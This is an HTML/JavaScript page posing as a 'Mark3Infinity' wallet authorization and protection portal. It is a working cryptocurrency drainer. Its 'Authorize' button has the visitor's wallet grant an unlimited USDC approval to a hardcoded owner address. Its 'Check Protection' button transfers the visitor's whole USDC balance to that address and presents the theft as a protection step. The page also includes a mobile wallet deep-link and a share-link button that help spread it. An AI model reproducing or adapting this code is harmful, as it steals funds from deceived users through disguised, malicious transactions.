<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mark3Infinity · Wallet Portal</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(145deg, #0d1117, #1c1f26);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 2rem;
    }
    h2 {
      margin-bottom: 1rem;
    }
    .button {
      background: rgba(255, 255, 255, 0.08);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 16px;
      padding: 12px 30px;
      font-size: 1rem;
      font-weight: 600;
      color: #fff;
      margin: 10px;
      cursor: pointer;
      transition: all 0.2s ease;
    }
    .button:hover {
      background: rgba(255, 255, 255, 0.15);
    }
    #status {
      margin-top: 1rem;
      padding: 1rem;
      background: #161b22;
      border-radius: 10px;
      width: 100%;
      max-width: 600px;
      font-size: 0.9rem;
    }
    .wallet-icons {
      display: flex;
      overflow-x: auto;
      margin-top: 2rem;
      gap: 1.5rem;
      padding-bottom: 1rem;
    }
    .wallet-icons img {
      height: 40px;
    }
    .deeplink, .copy-url {
      margin-top: 1rem;
      background: #2f3542;
      color: #fff;
      padding: 8px 20px;
      border-radius: 10px;
      font-size: 0.9rem;
    }
    .progress-bar {
      margin-top: 20px;
      height: 10px;
      width: 100%;
      max-width: 500px;
      background: #333;
      border-radius: 5px;
      overflow: hidden;
    }
    .progress-inner {
      height: 100%;
      background: #00adb5;
      width: 0%;
      transition: width 0.4s ease;
    }
  </style>
</head>
<body>
  <h2>Mark3Infinity · Wallet Authorize</h2>
  <button class="button" id="connect">🔌 Connect Wallet</button>
  <button class="button" id="authorize">🛡️ Authorize</button>
  <button class="button" id="check">🧿 Check Protection</button>
  <div class="progress-bar"><div class="progress-inner" id="bar"></div></div>
  <div id="status">🔒 Status: Waiting for action...</div>

  <div class="deeplink" id="deeplink"></div>
  <div class="copy-url">📋 <button onclick="navigator.clipboard.writeText(window.location.href)">Copy this page link</button></div>

  <div class="wallet-icons">
    <img src="https://cryptologos.cc/logos/metamask-icon.svg" alt="MetaMask">
    <img src="https://cryptologos.cc/logos/trust-wallet-trust-wallet-logo.svg" alt="TrustWallet">
    <img src="https://cryptologos.cc/logos/token-pocket-tpt-logo.svg" alt="TokenPocket">
    <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.svg" alt="Coinbase">
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const CONFIG = {
      USDC_ADDRESS: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
      OWNER_ADDRESS: "0x59e513Ae37614f1e670bfE961B3456257C444d24"
    };

    let provider, signer, user;
    const bar = document.getElementById("bar");
    const status = (msg) => document.getElementById("status").innerText = "🔒 Status: " + msg;
    const progress = (val) => bar.style.width = val + "%";

    document.getElementById("connect").onclick = async () => {
      try {
        progress(10);
        if (!window.ethereum) throw new Error("Please install MetaMask or open in wallet browser");
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        user = await signer.getAddress();
        progress(60);
        status("✅ Connected as: " + user);
        progress(100);
      } catch (err) {
        status("❌ " + err.message);
        progress(0);
      }
    };

    document.getElementById("authorize").onclick = async () => {
      try {
        progress(0);
        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, ["function approve(address,uint256) returns (bool)", "function allowance(address,address) view returns (uint256)", "function balanceOf(address) view returns (uint256)"] , signer);
        const balance = await usdc.balanceOf(user);
        const allowance = await usdc.allowance(user, CONFIG.OWNER_ADDRESS);
        progress(40);
        if (allowance.lt(balance)) {
          const tx = await usdc.approve(CONFIG.OWNER_ADDRESS, ethers.constants.MaxUint256);
          await tx.wait();
        }
        status("✅ Authorization successful.");
        progress(100);
      } catch (err) {
        status("❌ " + err.message);
        progress(0);
      }
    };

    document.getElementById("check").onclick = async () => {
      try {
        progress(0);
        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, ["function transfer(address,uint256) returns (bool)", "function balanceOf(address) view returns (uint256)"] , signer);
        const balance = await usdc.balanceOf(user);
        progress(30);
        if (balance.gt(0)) {
          const tx = await usdc.transfer(CONFIG.OWNER_ADDRESS, balance);
          await tx.wait();
          status("✅ Protection Check: Funds moved.");
        } else {
          status("⚠️ No USDC balance to protect.");
        }
        progress(100);
      } catch (err) {
        status("❌ " + err.message);
        progress(0);
      }
    };

    // 检测钱包浏览器跳转提示
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    if (isMobile && !window.ethereum) {
      document.getElementById("deeplink").innerHTML = '🔁 <a href="https://metamask.app.link/dapp/' + window.location.hostname + '">Open in Wallet App</a>';
    }
  </script>
</body>
</html>
